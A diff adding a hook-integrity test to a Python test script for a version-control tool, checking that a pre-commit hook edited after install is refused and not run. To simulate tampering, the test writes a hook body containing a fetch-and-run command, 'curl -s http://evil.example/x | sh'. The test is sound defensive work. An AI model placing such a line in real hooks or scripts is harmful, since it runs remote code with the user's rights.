@@ -1051,6 +1051,110 @@ def main():
             (ok[1] or "")[:200],
         )
 
+    if want("hook-integrity"):
+        # A hook runs with the user's rights. Checking it only when somebody remembers to ask
+        # protects nothing; the check has to be at the moment it runs.
+        import tempfile as _tf
+        import json as _json
+        d = _tf.mkdtemp()
+        sh(f"{ZF} init", cwd=d)
+        with open(os.path.join(d, "a.txt"), "w") as fh:
+            fh.write("x\n")
+
+        # Nothing installed: status is quiet and a commit goes through.
+        st = sh(f"{ZF} hook status", cwd=d)
+        record(
+            "hook status lists a hook point that is not installed",
+            "absent" in (st[1] or "") and "pre-land" in (st[1] or ""),
+            (st[1] or "")[:200],
+        )
+
+        body = "#!/bin/sh\necho legit-hook-ran >&2\n"
+        r = subprocess.run(
+            [ZF, "hook", "install", "pre-commit"],
+            cwd=d, input=body, capture_output=True, text=True,
+        )
+        record("a hook can be installed from stdin", r.returncode == 0, (r.stdout or r.stderr)[:160])
+
+        st = sh(f"{ZF} hook status", cwd=d)
+        record(
+            "an installed hook reads as unchanged",
+            "unchanged  pre-commit" in (st[1] or ""),
+            (st[1] or "")[:200],
+        )
+
+        m = re.search(r"(cs[0-9a-f]+)", sh(f'{ZF} changeset create "one" --author t', cwd=d)[1])
+        cs1 = m.group(1) if m else ""
+        one = sh(f"{ZF} changeset commit {cs1}", cwd=d)
+        record(
+            "a matching hook is allowed to run",
+            "legit-hook-ran" in (one[1] or "") and one[0] == 0,
+            (one[1] or "")[:200],
+        )
+
+        with open(os.path.join(d, "b.txt"), "w") as fh:
+            fh.write("y\n")
+        m = re.search(r"(cs[0-9a-f]+)", sh(f'{ZF} changeset create "two" --author t', cwd=d)[1])
+        cs2 = m.group(1) if m else ""
+
+        # Replace the hook behind the repository's back.
+        with open(os.path.join(d, ".gesta", "hooks", "pre-commit"), "w") as fh:
+            fh.write("#!/bin/sh\ncurl -s http://evil.example/x | sh\necho PWNED >&2\n")
+
+        st = sh(f"{ZF} hook status", cwd=d)
+        record(
+            "a hook edited after install reads as changed",
+            "changed    pre-commit" in (st[1] or ""),
+            (st[1] or "")[:200],
+        )
+
+        bad = sh(f"{ZF} changeset commit {cs2}", cwd=d)
+        record(
+            "a changed hook is refused instead of executed",
+            bad[0] != 0 and "changed after it was installed" in (bad[1] or ""),
+            (bad[1] or "")[:240],
+        )
+        record(
+            "and the tampered body did not run",
+            "PWNED" not in (bad[1] or ""),
+            (bad[1] or "")[:200],
+        )
+
+        left = sh(f"{ZF} changeset list", cwd=d)
+        record(
+            "the refused commit left the changeset pending",
+            cs2 in (left[1] or ""),
+            (left[1] or "")[:200],
+        )
+
+        # Reinstalling is how a deliberate edit is accepted.
+        r = subprocess.run(
+            [ZF, "hook", "install", "pre-commit"],
+            cwd=d, input="#!/bin/sh\necho v2-hook >&2\n", capture_output=True, text=True,
+        )
+        again = sh(f"{ZF} changeset commit {cs2}", cwd=d)
+        record(
+            "reinstalling accepts a deliberate edit and the commit goes through",
+            again[0] == 0 and "v2-hook" in (again[1] or ""),
+            (again[1] or "")[:200],
+        )
+
+        js = sh_out(f"{ZF} --json hook status", cwd=d)
+        try:
+            payload = _json.loads(js[1])
+            entry = next(h for h in payload["hooks"] if h["name"] == "pre-commit")
+            ok = (
+                entry["installed"] is True
+                and entry["changed"] is False
+                and entry["recorded"] == entry["current"]
+                and payload["changed"] == 0
+                and payload.get("schema")
+            )
+            why = js[1][:240]
+        except Exception as exc:
+            ok, why = False, f"not JSON: {exc}"
+        record("hook status --json reports the hashes and agrees with itself", ok, why)
+
     if want("gc"):
         # A repository that only grows is a repository that gets slower and bigger forever. The
         # check plants an object nothing references and asks gc to remove exactly that one.
